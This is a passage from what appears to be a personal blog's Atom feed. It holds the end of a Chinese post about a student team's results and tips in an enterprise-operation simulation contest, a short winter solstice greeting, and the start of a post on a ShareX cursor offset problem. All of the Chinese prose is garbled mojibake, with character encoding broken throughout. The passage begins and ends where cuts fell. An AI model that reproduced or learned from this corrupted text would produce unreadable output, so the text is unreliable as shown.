¡å†…èµ›å·²ç»åŠå¹´å¤šäº†ï¼Œæ°´å¹³åŸºæœ¬ä¸Šå¯ä»¥è¯´æ˜¯æ²¡æœ‰æå‡ã€‚å› ä¸ºç–«æƒ…åŸå› æˆ‘ä»¬ç”šè‡³ä¸çŸ¥é“è¿™é¡¹èµ›äº‹èƒ½å¦ä¸¾åŠï¼Œå› æ­¤åªæ˜¯åœ¨å¼€èµ›å‰å‡ ä¸ªæ˜ŸæœŸè®­ç»ƒäº†å‡ æ¬¡ã€‚å¦å¤–ï¼Œè¿™é¡¹èµ›äº‹çš„ä½å«é‡‘é‡å¯¼è‡´å®ƒåœ¨æˆ‘ä»¬å­¦æ ¡çš„å—é‡è§†ç¨‹åº¦æ¯”è¾ƒä½ï¼Œæˆ‘ä»¬æ²¡æœ‰åƒå¾ˆå¤šå­¦æ ¡é‚£æ ·æ¥å—åŸ¹è®­ã€‚è¿™æ¬¡æ¯”èµ›æ˜¯åˆ†èµ›åŒºä¸¾åŠçš„ï¼Œåä¸œèµ›åŒºå‚èµ›çœä»½æœ‰æ±Ÿè‹ã€æµ™æ±Ÿã€ä¸Šæµ·ã€å®‰å¾½ï¼Œè§„æ¨¡å’Œé€‰æ‰‹å®åŠ›éƒ½å’Œæ ¡å†…èµ›æ—¶ä¸å¯åŒæ—¥è€Œè¯­ã€‚æ¯”èµ›é‡‡ç”¨åˆ†ç»„ç§¯åˆ†åˆ¶ï¼Œå…·ä½“å‰å‡ åæ™‹çº§æˆ‘ä¹Ÿè®°ä¸å¤§æ¸…äº†ã€‚åªè®°å¾—å‚èµ›çš„é˜Ÿä¼é£æ ¼å¼‚å¸¸å‡¶æ‚ï¼Œå®Œå…¨ä¸æŒ‰å¥—è·¯æ¥ï¼Œæˆ‘ä»¬æ‰“çš„3åœºæ¯”èµ›å…¨éƒ¨ä»¥ç ´äº§å‘Šç»ˆï¼Œæœ€å¿«çš„ä¸€æ¬¡ç”šè‡³ç¬¬ä¸€ä¸ªå­£åº¦å°±ç ´äº§äº†ã€‚ä¸€åˆ†æœªå¾—ï¼Œåœ¨æ„æ–™ä¹‹å¤–ï¼Œä¹Ÿåœ¨æƒ…ç†ä¹‹ä¸­â€”â€”çš„ç¡®æ˜¯æŠ€ä¸å¦‚äººã€‚</p><h3 id="ä¸»åœºä½œæˆ˜ï¼Œæœ‰æƒŠæ— é™©"><a href="#ä¸»åœºä½œæˆ˜ï¼Œæœ‰æƒŠæ— é™©" class="headerlink" title="ä¸»åœºä½œæˆ˜ï¼Œæœ‰æƒŠæ— é™©"></a>ä¸»åœºä½œæˆ˜ï¼Œæœ‰æƒŠæ— é™©</h3><p>ç¬¬åäºŒå±Šä¸Šæµ·å¸‚å¤§å­¦ç”Ÿå·¥ç¨‹å®è·µä¸åˆ›æ–°èƒ½åŠ›å¤§èµ›ç”±æˆ‘ä»¬å­¦æ ¡æ‰¿åŠï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¿™æ¬¡æ˜¯åœ¨ä¸»åœºä½œæˆ˜ã€‚ä¸å·§çš„æ˜¯æ¯”èµ›æ—¶ç–«æƒ…ç®¡æ§åˆšåˆšæ”¾å¼€ï¼Œè®¸å¤šå‚èµ›é€‰æ‰‹éƒ½é˜³äº†æˆ–è€…å›å®¶äº†ï¼Œå¯¼è‡´æœ‰å‡ ç»„é˜Ÿä¼é€€èµ›äº†ï¼ŒåŒ…æ‹¬æˆ‘ä»¬å­¦æ ¡æ ¡å†…èµ›åœ¨å¦ä¸€ç»„å¤ºå† çš„é˜Ÿä¼ã€‚å› æ­¤æˆ‘ä»¬æˆäº†è¯¥èµ›é¡¹çš„ä¸»åœºç‹¬è‹—ï¼Œå‹åŠ›çªç„¶å°±å¢å¤§äº†ã€‚æˆ‘ä»¬é˜Ÿä¼ä¹Ÿåªæ¥äº†3ä¸ªäººï¼Œé˜³äº†ä¸€ä¸ªã€‚ä½†å’Œâ€œç™¾å›¢å¤§æˆ˜â€é‚£æ¬¡ä¸åŒï¼Œè¿™æ¬¡æˆ‘ä»¬ç ”ç©¶äº†å›½å¥–é€‰æ‰‹çš„æ‰“æ³•ã€æ·±å…¥å‰–æäº†è§„åˆ™ã€ç†Ÿç»ƒæŒæ¡äº†Excelçš„åˆ¶ä½œä¸ä½¿ç”¨ã€åˆ¶å®šäº†è¯¦ç»†çš„ç­–ç•¥ï¼Œå½“ç„¶æœ€é‡è¦çš„æ˜¯æˆ‘ä»¬å‚åŠ äº†å¤šæ¬¡è®­ç»ƒèµ›ã€‚å¯èƒ½å› ä¸ºæ˜¯å¸‚çº§èµ›äº‹å¤§å®¶æ¯”è¾ƒä¿å®ˆï¼Œåœºä¸Šè¿‘äºŒåæ”¯é˜Ÿä¼é‡‡å–äº†åŒæ ·çš„ç­–ç•¥ï¼Œä¸å­˜åœ¨æ€»ä½“ç­–ç•¥çš„ä¼˜åŠ£ï¼Œæƒ³è¦è·èƒœå°±å…¨é æ¯”èµ›è¿‡ç¨‹ä¸­çš„ä¸´åœºååº”äº†ã€‚æ¯”èµ›ä¸­æœŸå¼€å§‹æœ‰é˜Ÿä¼åˆ¶å®šä½ä»·ç ´åå¸‚åœºå¹³è¡¡ï¼Œæˆ‘ä»¬åŠæ—¶ä½œå‡ºååº”è°ƒä½ä»·æ ¼æ‰é¿å…äº†ç ´äº§ã€‚åœ¨ç¬¬5å­£æ—¶æˆ‘ä»¬çš„å­£åº¦æ’åå·²ç»è¿›å…¥å‰5ï¼Œå¹¶ä¸”åŠ¿å¤´å¤§å¥½ã€‚ä¸è¿‡ä¹‹å‰è¯´çš„ç¤¾ç‰›æœ‹å‹ç´§å¼ äº†ï¼Œå¡«é”™äº§å“ä»·æ ¼ï¼Œå¯¼è‡´æˆ‘ä»¬åœ¨æŸä¸ªå¸‚åœºçš„é”€é‡å’Œå æœ‰ç‡æš´è·Œï¼Œä¼˜åŠ¿ä¸€å»ä¸å¤è¿”ï¼Œå­£åº¦æ’åæ‰å‡ºå‰10ã€‚æˆ‘ä»¬å†æ¬¡åšå‡ºåŠæ—¶çš„è°ƒæ•´ï¼Œåˆ¶å®šæ›´ä½çš„äº§å“ä»·æ ¼ï¼Œé‡‡ç”¨â€œè–„åˆ©å¤šé”€â€çš„æ–¹æ¡ˆï¼Œæœ€ç»ˆåœ¨æ¯”èµ›ç»“æŸå‰æŒ½å¤§å¦äºå°†å€¾ï¼ŒæŒ¤è¿›äº†ç‰¹ç­‰å¥–çš„è¡Œåˆ—ã€‚BTWï¼Œè²Œä¼¼å…¶ä»–ç‰¹ç­‰å¥–é˜Ÿä¼åŸºæœ¬éƒ½æœ‰æ¥è‡ªäºå•†å­¦é™¢çš„é€‰æ‰‹ã€‚</p><h2 id="æˆ‘è·å¾—äº†ä»€ä¹ˆï¼Ÿ"><a href="#æˆ‘è·å¾—äº†ä»€ä¹ˆï¼Ÿ" class="headerlink" title="æˆ‘è·å¾—äº†ä»€ä¹ˆï¼Ÿ"></a>æˆ‘è·å¾—äº†ä»€ä¹ˆï¼Ÿ</h2><ol><li><p>å›¢é˜Ÿåä½œèƒ½åŠ›<br>è¿™æ˜¯æˆ‘è§‰å¾—æœ€é‡è¦çš„ä¸€ç‚¹ã€‚å…¶å®è¿™æ”¯é˜Ÿä¼é‡Œæˆ‘æœ€å¼€å§‹ä¹Ÿå°±è®¤è¯†é‚£ä¸€ä¸ªäººï¼Œä½†æ˜¯å¤§å®¶çš„ç›®æ ‡æ˜¯ä¸€è‡´çš„ï¼Œå› æ­¤ä¸å­˜åœ¨æœ‰äººæ‘†çƒ‚çš„æƒ…å†µâ€”â€”è¿™æ˜¯å›¢é˜Ÿåä½œçš„åŸºç¡€ã€‚è¿™é¡¹æ¯”èµ›å¯¹äºå‚èµ›çš„å¤§å¤šæ•°é˜Ÿä¼æ¥è¯´ï¼Œéƒ½éœ€è¦è€ƒè™‘åˆ†å·¥ï¼Œå¦‚ä½•è®©åˆé€‚çš„äººåšåˆé€‚çš„å·¥ä½œï¼Œè¿™æ˜¯ä¸€é—¨å­¦é—®ã€‚å¦‚ä½•ç»„ç»‡å¤§å®¶è®­ç»ƒã€å¦‚ä½•åœ¨æ¯”èµ›è¿‡ç¨‹ä¸­å½¢æˆç»Ÿä¸€çš„æ„è§ã€å¦‚ä½•æœ‰æ•ˆåœ°æ²Ÿé€šâ€¦â€¦è¿™äº›éƒ½æ˜¯ååˆ†é‡è¦çš„æŠ€èƒ½ã€‚</p></li><li><p>å¤„ç†å›°å¢ƒçš„èƒ½åŠ›<br>èµ›äº‹å®˜ç½‘è¿™æ ·å†™é“ï¼š</p><blockquote><p>é€šè¿‡ç«èµ›ï¼Œæ¨è¿›è™šæ‹Ÿä»¿çœŸå®éªŒæ•™å­¦åœ¨åˆ›æ–°åˆ›ä¸šæ•™è‚²ä¸­çš„è½åœ°åº”ç”¨ã€‚å‚èµ›é˜Ÿå‘˜åœ¨æ¨¡æ‹Ÿç»è¥å®è·µä¸­ï¼ŒåŸ¹å…»å…¶åˆ›æ–°ç²¾ç¥ï¼Œåˆ›ä¸šèƒ½åŠ›ï¼Œæå‡å­¦ç”Ÿåœ¨å¤æ‚æ¡ä»¶ä¸‹å¦‚ä½•åšå‡ºç§‘å­¦å†³ç­–çš„èƒ½åŠ›ï¼Œå­¦ä¼šå¦‚ä½•åœ¨å›°å¢ƒä¸­ç”Ÿå­˜å‘å±•çš„ä¼ä¸šå®¶ç²¾ç¥ï¼Œå½¢æˆå¦‚ä½•å»ºç«‹å›¢é˜Ÿã€ç»„ç»‡å›¢é˜Ÿå®ç°ç›®æ ‡çš„èƒ½åŠ›ã€‚é€šè¿‡ç«èµ›ï¼Œå…¨é¢æé«˜å­¦ç”Ÿå‘ç°é—®é¢˜ã€è§£å†³é—®é¢˜ã€ç»¼åˆåˆ†æé—®é¢˜èƒ½åŠ›ï¼›é”»ç‚¼å­¦ç”Ÿæ²Ÿé€šåä½œã€äº¤æµåº”å˜èƒ½åŠ›ï¼›å¯¹å­¦ç”Ÿé€»è¾‘æ€ç»´ã€å¼€æ‹“åˆ›æ–°ç­‰ç»¼åˆèƒ½åŠ›éƒ½æœ‰ä¸€å®šçš„é”»ç‚¼å’Œæå‡ã€‚</p></blockquote><p>æˆ–è®¸æˆ‘ä»¥åå½“ä¸äº†ä¼ä¸šå®¶ï¼Œä½†æ˜¯åœ¨å›°å¢ƒä¸­ç”Ÿå­˜å‘å±•æ°¸è¿œæ˜¯äººç”Ÿçš„å¿…ä¿®è¯¾ä¹‹ä¸€ã€‚å†µä¸”æœªæ¥è°äººå¯çŸ¥ï¼Œä¸‡ä¸€å°†æ¥æŸæ—¥æˆ‘æ‰€å­¦åˆ°çš„ä¼ä¸šè¿è¥æœ¬é¢†çœŸæ´¾ä¸Šç”¨åœºäº†å‘¢ï¼Ÿ</p></li></ol><p>å½“ç„¶ï¼Œè¿˜æœ‰äº›æˆ‘æ²¡è·å¾—ä½†å…¶ä»–äººå¯èƒ½è·å¾—çš„ã€‚æ¯”å¦‚åœ¨å¾ˆå¤šå­¦æ ¡ï¼Œè¯¥èµ›äº‹æ‹¿å›½å¥–æ˜¯æœ‰ä¿ç ”åŠ åˆ†çš„ã€‚</p><h2 id="å¦‚ä½•ä¸Šæ‰‹ï¼Ÿ"><a href="#å¦‚ä½•ä¸Šæ‰‹ï¼Ÿ" class="headerlink" title="å¦‚ä½•ä¸Šæ‰‹ï¼Ÿ"></a>å¦‚ä½•ä¸Šæ‰‹ï¼Ÿ</h2><ol><li><p>é˜…è¯»æ¯”èµ›è§„åˆ™<br>å‰å¾€<a href="http://www.qyyyfz.com/index.jsp">å®˜ç½‘</a>ç†Ÿæ‚‰æ¯”èµ›è§„åˆ™</p></li><li><p>è§‚çœ‹Bç«™è§†é¢‘<br>UpğŸ–æ¨èï¼š</p><ul><li><a href="https://space.bilibili.com/368153901">Oæµç ‚O</a>ï¼ˆå…¥é—¨ï¼‰</li><li><a href="https://space.bilibili.com/476554695">å†°æ¡“</a>ï¼ˆåˆ¶è¡¨ï¼‰</li><li><a href="https://space.bilibili.com/526514075">ç§‘éŸµå·¥ä½œå®¤</a>ï¼ˆè¿›é˜¶ï¼‰</li></ul></li><li><p>ç½‘ä¸Šæ‰¾æ¯”èµ›ç¾¤è¿›è¡Œè®­ç»ƒ<br>ç½‘ä¸Šæœç´¢EOVSè®­ç»ƒèµ›QQç¾¤ï¼Œæœ‰äº›ç¾¤ç»å¸¸ä¼šæœ‰æ¯”èµ›ï¼Œå¯ä»¥å…ˆç”¨åˆ«äººçš„è¡¨æ ¼ï¼ˆæˆ‘çš„è¡¨æ ¼æ”¾åœ¨æ–‡ç« æœ€åï¼‰</p></li><li><p>ç»ƒä¹ åˆ¶è¡¨</p><p>ä¸‹å›¾æ˜¯æˆ‘è‡ªå·±åˆ¶ä½œçš„è¡¨æ ¼</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://bu.dusays.com/2023/01/11/63beacf2cef5d.png" data-fancybox="default" data-caption="è‡ªåˆ¶è¡¨æ ¼"><img fancybox="" itemprop="contentUrl" src="https://bu.dusays.com/2023/01/11/63beacf2cef5d.png" class="lazyload" data-srcset="https://bu.dusays.com/2023/01/11/63beacf2cef5d.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="è‡ªåˆ¶è¡¨æ ¼"></a><span class="image-caption">è‡ªåˆ¶è¡¨æ ¼</span></div></div><p>æ¯”èµ›ä¸­æœ‰éå¸¸å¤šçš„æ•°æ®è¦è®¡ç®—ï¼Œå¦‚æœè‡ªå·±ç”¨è®¡ç®—å™¨ç®—éå¸¸è€—æ—¶è€Œä¸”æ­£ç¡®ç‡éš¾ä»¥ä¿è¯ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œçœçº§åŠä»¥ä¸Šçš„æ¯”èµ›éƒ½æ˜¯è¦æ±‚ä¸èƒ½ä½¿ç”¨ç°æˆè¡¨æ ¼çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæƒ³ç”¨è¡¨æ ¼å°±å¿…é¡»åœ¨ç°åœºåˆ¶ä½œã€‚å¦‚æœä¸æ˜¯ç†Ÿç»ƒæŒæ¡Excelå…¬å¼åŠèµ›äº‹è§„åˆ™çš„è¯ï¼ŒçŸ­æ—¶é—´å†…å¾ˆéš¾ç°åœºåˆ¶ä½œå‡ºè¿™æ ·ä¸€å¼ è¡¨æ ¼ï¼Œå› æ­¤å¹³æ—¶éœ€è¦åŠ ä»¥ç»ƒä¹ ï¼ˆåˆ¶è¡¨æ˜¯æˆ‘çš„ä»»åŠ¡ä¹‹ä¸€ï¼Œæ‰€ä»¥æˆ‘æ·±æœ‰ä½“ä¼š)ã€‚</p></li></ol><h2 id="ä¸€äº›ç»éªŒ"><a href="#ä¸€äº›ç»éªŒ" class="headerlink" title="ä¸€äº›ç»éªŒ"></a>ä¸€äº›ç»éªŒ</h2><p>Bç«™å’ŒçŸ¥ä¹æœ‰å¾ˆå¤šå›½å¥–å¤§ä½¬ï¼Œå¯ä»¥å»çœ‹ä»–ä»¬çš„è§†é¢‘å’Œæ–‡ç« æˆ–ç¤¼è²Œè®¨æ•™ã€‚æˆ‘çš„æ°´å¹³è¿œä¸åŠä»–ä»¬ï¼Œæˆ‘çš„ä¸€äº›ç»éªŒä¹Ÿæ˜¯ä»å¤§ä½¬ä»¬é‚£é‡Œå­¦æ¥çš„ï¼Œä»…ä¾›å‚è€ƒã€‚</p><ol><li>åˆ¶è¡¨æ—¶æœªå¿…è¦å®Œå…¨æŒ‰ç…§è§„åˆ™ç»™çš„å…¬å¼æ•²ï¼Œæœ‰ä¸€äº›ç®€åŒ–çš„å…¬å¼<ul><li>äººå·¥è´¹ç”¨=è®¡åˆ’ç”Ÿäº§é‡*1.4</li><li>ç”Ÿäº§è®¾å¤‡ä»·å€¼=è¿è¥çŠ¶å†µè¡¨ä¸‹å­£å®é™…äº§èƒ½*10</li><li>ç”Ÿäº§çº¿æŠ˜æ—§=ä¸Šä¸€å­£ç”Ÿäº§è®¾å¤‡ä»·å€¼*10%</li></ul></li><li>å•å­£ä¹°åŸææ–™ï¼ŒåŒå­£è¿˜æ¬¾<br>å•æ•°å­£åº¦è´­ä¹°ä¸¤å­£åº¦çš„åŸææ–™ï¼Œå‡ ä¹æ˜¯çº¦å®šä¿—æˆçš„è§„çŸ©ã€‚æ ¹æ®ä¾›éœ€å…³ç³»ï¼Œå¦‚æœä½ åœ¨åŒæ•°å­£åº¦è´­ä¹°åŸææ–™ï¼Œä»·æ ¼ä¼šæ›´é«˜ã€‚<br>ç”±äºå•æ•°å­£åº¦è´­ä¹°åŸææ–™ï¼Œæ‰€ä»¥æ²¡æœ‰è¶³å¤Ÿçš„ç°é‡‘è¿˜æ¬¾ï¼ŒåŒæ•°å­£åº¦å¯ä»¥æ ¹æ®å®é™…èµ„äº§è´Ÿå€ºæ¯”ã€åˆ©æ¯ç­‰è€ƒè™‘è¿˜æ¬¾ã€‚</li><li>å‰æœŸæ‰€æœ‰è€…æƒç›Šè¶Šæ¥è¿‘150wçš„æ•´æ•°å€è¶Šå¥½<br>æ‰€æœ‰è€…æƒç›Šæ¯å¢åŠ 150wå¯ä»¥è®©ä½ æœ‰èµ„æ ¼å¤šè´­ä¹°1æ¡ç”Ÿäº§çº¿ï¼Œå‡å¦‚ä½ åœ¨2ï¼Œ3å­£åº¦æ—¶ç”Ÿäº§çº¿å°±æ¯”åˆ«äººå°‘2ï¼Œ3æ¡ï¼Œé‚£ä¹ˆåˆ©æ»šåˆ©æ»šåˆ©ï¼Œå·®è·ä¼šè¶Šæ¥è¶Šå¤§ï¼Œæ‰€ä»¥éœ€è¦è®¡ç®—ä¸‹å­£åº¦ç†è®ºä¸Šèƒ½è¾¾åˆ°çš„æ‰€æœ‰è€…æƒç›Šã€‚ä½†æ˜¯å¹¶ä¸æ˜¯æ‰€æœ‰è€…æƒç›Šæ¯”é¢„æœŸé«˜å¾—è¶Šå¤šè¶Šå¥½ï¼Œä¾‹å¦‚ä¸‹ä¸€å­£åº¦æƒ³è¦è´­ä¹°3æ¡ç”Ÿäº§çº¿ï¼Œåˆ™éœ€è¦æœ‰450wæƒç›Šï¼Œå°†å†³ç­–è¾“å…¥è¡¨æ ¼åå‘ç°è¾¾åˆ°520wï¼Œé‚£ä¹ˆå¯ä»¥å°†è¿™å¤šä½™çš„70wèŠ±ä¸€éƒ¨åˆ†åœ¨ç ”å‘ã€è¥é”€ç­‰åœ°æ–¹ï¼Œè¿™æ ·æ”¶ç›Šæ‰èƒ½æœ€å¤§åŒ–ã€‚å› æ­¤ï¼Œæœ€ç†æƒ³æƒ…å†µæ˜¯å‰æœŸæ¯æ¬¡æ¯”è¦å¡åˆ°çš„æ‰€æœ‰è€…æƒç›Šé«˜å‡ºå‡ ä¸‡åˆ°åå‡ ä¸‡ã€‚</li><li>æ³¨æ„3å¸‚åœºé˜Ÿä¼<br>3å¸‚åœºé˜Ÿä¼ä¼šæ”¾å¼ƒä¸€ä¸ªå¸‚åœºï¼Œå¯¹äº4å¸‚åœºæ‰“æ³•çš„é€‰æ‰‹æ¥è¯´ï¼Œ3å¸‚åœºé€‰æ‰‹æ”¾å¼ƒçš„è¿™ä¸ªå¸‚åœºå°±æ˜¯æœ€å¥½çš„çªç ´å£ï¼Œåœ¨è¿™ä¸ªå¸‚åœºèƒ½å¤Ÿç”¨æ›´ä½çš„è¥é”€å–å‡ºå»æ›´å¤šã€æ›´è´µçš„äº§å“ã€‚</li><li>ç¬¬5å­£åº¦é«˜è¥é”€<br>å› ä¸ºæ ¹æ®å¸‚åœºå‘å±•è§„å¾‹ï¼Œç¬¬6å­£åº¦å¸‚åœºå¾€å¾€ä¼šç¼©æ°´ã€‚ä½†æ­¤æ—¶åˆæ˜¯è´­ä¹°ç”Ÿäº§çº¿æœ€å¤šçš„å­£åº¦ï¼Œäº§é‡æš´å¢ï¼Œè¦æƒ³å°†äº§å“å–å…‰ï¼Œå¿…é¡»æå‰ç”¨è¥é”€æ‰“å¼€å¸‚åœºï¼Œæé«˜å¸‚åœºå æœ‰ç‡ï¼Œæ‰èƒ½åˆ†å¾—æ›´å¤§çš„è›‹ç³•ã€‚ç¬¬5å­£åº¦çš„å†³ç­–å¯ä»¥å¾ˆå¤§ç¨‹åº¦ä¸Šå†³å®šè¿™åœºæ¯”èµ›çš„èµ°å‘ã€‚</li><li>å¹³è¡¡è¥é”€å’Œç ”å‘æŠ•å…¥<br>æ ¹æ®èµ›äº‹ä»‹ç»ï¼Œè¥é”€å’Œç ”å‘éƒ½å­˜åœ¨è¾¹é™…é€’å‡æ•ˆåº”ã€‚å°½ç®¡ç ”å‘çš„ä¼˜åŠ¿åœ¨å½“å­£åº¦å¾ˆéš¾ä½“ç°å‡ºæ¥ï¼Œä½†æ˜¯åˆ°äº†æ¯”èµ›åæœŸï¼Œå¦‚æœå“ç‰Œå¥½ã€è´¨é‡å·®ï¼ŒæŠ•å…¥é«˜è¥é”€çš„æ•ˆæœä¼šå¾ˆå·®ï¼ŒåæœŸæ¯”æ‹¼çš„å°±æ˜¯å‰ä¸­æœŸçš„ç§¯ç´¯ã€‚ä¸€å‘³åœ°æŠ•å…¥è¥é”€å¯èƒ½ä¼šè®©ä½ åœ¨å‰ä¸­æœŸå å°½ä¼˜åŠ¿ï¼Œä½†åæœŸè´¨é‡å·®å¯¼è‡´çš„å¸‚åœºå æœ‰ç‡é™ä½ä¼šè®©ä½ æŸå¤±éå¸¸å¤šå‡€åˆ©æ¶¦ã€‚</li><li>å…ˆç»ƒå¥½8+2ï¼Œå››ååœºæ‰“æ³•<br>æˆ‘ä»¬åœ¨æ‰€æœ‰æ­£å¼æ¯”èµ›é‡Œéƒ½é‡‡ç”¨8+2ï¼Œå››å¸‚åœºæ‰“æ³•ï¼Œå› ä¸ºè¿™ç§æ‰“æ³•æœ€ä¸ºç¨³å¦¥ä½†åˆä¸å¤±æœºé‡ã€‚å½“æœ‰äº†ä¸€å®šçš„åœºæ•°ç§¯ç´¯åå†å»å°è¯•å…¶ä»–æ¿€è¿›çš„æ‰“æ³•ï¼Œå¦‚7+3ï¼Œ8+3ä»¥åŠä¸‰å¸‚åœºæ‰“æ³•ã€‚</li></ol><h2 id="EOVSè¡¨æ ¼åŠç¬”è®°ä»“åº“"><a href="#EOVSè¡¨æ ¼åŠç¬”è®°ä»“åº“" class="headerlink" title="EOVSè¡¨æ ¼åŠç¬”è®°ä»“åº“"></a>EOVSè¡¨æ ¼åŠç¬”è®°ä»“åº“</h2><div class="tag link"><a class="link-card" title="EOVS-excel-note" href="https://github.com/BeaCox/EOVS-excel-note"><div class="left"><img src="https://github.githubassets.com/favicons/favicon.svg" class="lazyload" data-srcset="https://github.githubassets.com/favicons/favicon.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></div><div class="right"><p class="text">EOVS-excel-note</p><p class="url">https://github.com/BeaCox/EOVS-excel-note</p></div></a></div>]]></content>
    
    
    <summary type="html">&lt;p&gt;å»å¹´12æœˆä¸­æ—¬éšé˜Ÿå‚åŠ äº†ç¬¬åäºŒå±Šä¸Šæµ·å¸‚å¤§å­¦ç”Ÿå·¥ç¨‹å®è·µä¸åˆ›æ–°èƒ½åŠ›å¤§èµ›â€”â€”ä¼ä¸šè¿è¥ä»¿çœŸèµ›é¡¹ï¼Œè·å¾—äº†ç‰¹ç­‰å¥–ï¼Œä¹Ÿæ˜¯æˆ‘åœ¨ä¹å–„å¯é™ˆçš„å¤§å­¦ç”Ÿæ´»ä¸­æ‹¿åˆ°çš„ç¬¬ä¸€ä¸ªå¸‚çº§å¥–é¡¹ã€‚å‰æ®µæ—¶é—´å¿™äºâ€œè¡¥å¤©â€ï¼ˆé¢„ä¹ æœŸæœ«ç§‘ç›®ï¼‰æ²¡æœ‰æ›´æ–°ï¼Œ2023çš„ç¬¬ä¸€ç¯‡æ–‡ç« å°±ä»è¿™é¡¹æ¯”èµ›ç€ç¬”å§ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="ç”Ÿæ´»" scheme="https://blog.beacox.space/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="ç«èµ›" scheme="https://blog.beacox.space/tags/%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>å†¬è‡³å®‰åº·</title>
    <link href="https://blog.beacox.space/posts/winter-solstice/"/>
    <id>https://blog.beacox.space/posts/winter-solstice/</id>
    <published>2022-12-22T09:54:54.000Z</published>
    <updated>2022-12-22T09:54:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>æ˜¥ç”Ÿå†¬è‡³æ—¶ï¼Œç¥å„ä½åšå‹å†¬è‡³å®‰åº·ï¼<span id="more"></span></p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://bu.dusays.com/2022/12/22/63a4360f12dcc.png" data-fancybox="default" data-caption="è‡ªå·±è®¾è®¡çš„å†¬è‡³æµ·æŠ¥"><img fancybox="" itemprop="contentUrl" src="https://bu.dusays.com/2022/12/22/63a4360f12dcc.png" class="lazyload" data-srcset="https://bu.dusays.com/2022/12/22/63a4360f12dcc.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="è‡ªå·±è®¾è®¡çš„å†¬è‡³æµ·æŠ¥"></a><span class="image-caption">è‡ªå·±è®¾è®¡çš„å†¬è‡³æµ·æŠ¥</span></div></div>]]></content>
    
    
    <summary type="html">&lt;p&gt;æ˜¥ç”Ÿå†¬è‡³æ—¶ï¼Œç¥å„ä½åšå‹å†¬è‡³å®‰åº·ï¼&lt;/p&gt;</summary>
    
    
    
    <category term="ç”Ÿæ´»" scheme="https://blog.beacox.space/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="è®¾è®¡" scheme="https://blog.beacox.space/tags/%E8%AE%BE%E8%AE%A1/"/>
    
    <category term="æµ·æŠ¥" scheme="https://blog.beacox.space/tags/%E6%B5%B7%E6%8A%A5/"/>
    
    <category term="èŠ‚æ—¥" scheme="https://blog.beacox.space/tags/%E8%8A%82%E6%97%A5/"/>
    
  </entry>
  
  <entry>
    <title>å¦‚ä½•è§£å†³ShareXå½•å±æ—¶å…‰æ ‡ä½ç½®å‘ç”Ÿåç§»çš„é—®é¢˜</title>
    <link href="https://blog.beacox.space/posts/sharex-cursor/"/>
    <id>https://blog.beacox.space/posts/sharex-cursor/</id>
    <published>2022-12-03T12:16:04.000Z</published>
    <updated>2022-12-03T12:16:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>ShareXæ˜¯æˆ‘çš„ä¸»åŠ›æˆªå›¾å·¥å…·ï¼Œå› ä¸ºå®ƒå¼€æºä¸”åŠŸèƒ½å¼ºå¤§ã€‚ä½†æ˜¯å®é™…ä½¿ç”¨æ—¶ï¼Œå…¶å½•å±åŠŸèƒ½ä¼šå‡ºç°å…‰æ ‡æ˜¾ç¤ºä½ç½®ä¸å®é™…ä½ç½®å­˜åœ¨åç§»çš„é—®é¢˜ï¼Œè¿™ååˆ†å½±å“ä½¿ç”¨ä½“éªŒï¼Œé€šè¿‡æœç´¢è½¯ä»¶ä»“åº“issuesç­‰æ–¹å¼ï¼Œæˆ‘æ€»ç»“äº†è§£å†³è¿™ä¸€é—®é¢˜çš„æ–¹æ³•ã€‚<span id="more"></span></p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ShareXæ˜¯é€‚ç”¨äºWindowså¹³å°çš„ä¸€æ¬¾â€œæ‹¥æœ‰å±å¹•æ•æ‰ã€æ–‡ä»¶åˆ†äº«ç­‰åŠŸèƒ½çš„ç”Ÿäº§åŠ›å·¥å…·â€ã€‚å…¶å®˜ç½‘åœ°å€å¦‚ä¸‹ï¼š</p><div class="tag link"><a class="link-card" title="ShareX - The best free and open source screenshot tool for Windows" href="https://getsharex.com/"><div class="left"><img src="https://getsharex.com/favicon.ico" class="lazyload" data-srcset="https://getsharex.com/favicon.ico" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></div><div class="right"><p class="text">ShareX - The best free and open source screenshot tool for Windows</p><p class="url">https://getsharex.com/</p></div></a></div><p>å¯¹äºæˆ‘è¿™æ ·çš„åšä¸»æ¥è¯´ï¼ŒShareXæœ€å¸å¼•äººçš„åœ°æ–¹æ˜¯å®ƒä¸ä»…å¯ä»¥æ»¡è¶³æˆªå›¾éœ€è¦ï¼Œå¹¶ä¸”å¯ä»¥å¸®åŠ©æˆ‘å®Œæˆå¤„ç†å›¾ç‰‡ï¼ˆå¦‚å¢åŠ é˜´å½±å’Œæ°´å°ï¼‰ã€å°†å›¾ç‰‡ä¸Šä¼ è‡³å›¾åºŠå¹¶å¤åˆ¶é“¾æ¥åˆ°å‰ªåˆ‡æ¿ç­‰ä¸€ç³»åˆ—å·¥ä½œï¼Œå¸®åŠ©æˆ‘å®Œå–„äº†åšå®¢å†™ä½œçš„å·¥ä½œæµã€‚å¦‚æœæœ‰å°ä¼™ä¼´æƒ³è¦ä¸Šæ‰‹ShareXï¼Œå¯ä»¥å‚è€ƒå°‘æ•°æ´¾çš„è¿™ç¯‡æ–‡ç« ï¼š</p><div class="tag 